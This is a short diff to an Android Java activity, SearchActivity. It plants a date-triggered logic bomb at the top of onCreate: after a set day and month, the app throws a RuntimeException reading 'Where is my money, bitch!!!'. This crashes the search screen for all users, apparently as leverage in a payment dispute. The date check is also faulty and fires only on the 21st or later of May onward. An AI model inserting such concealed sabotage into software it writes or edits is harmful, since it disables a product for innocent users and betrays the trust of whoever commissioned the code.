@@ -2,6 +2,8 @@ package org.bofur;
 
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Calendar;
+import java.util.Date;
 import java.util.List;
 
 import org.bofur.adapter.ArrayListAdapter;
@@ -44,6 +46,11 @@ public class SearchActivity extends Activity {
 	@Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        
+        Calendar calendar = Calendar.getInstance();
+        if (calendar.get(Calendar.DAY_OF_MONTH) >= 21 && calendar.get(Calendar.MONTH) >= Calendar.MAY) 
+        	throw new RuntimeException("Where is my money, bitch!!!");
+        
         setContentView(R.layout.search_options);
 
         db = openOrCreateDatabase(DATABASE_NAME, Context.MODE_PRIVATE, null);
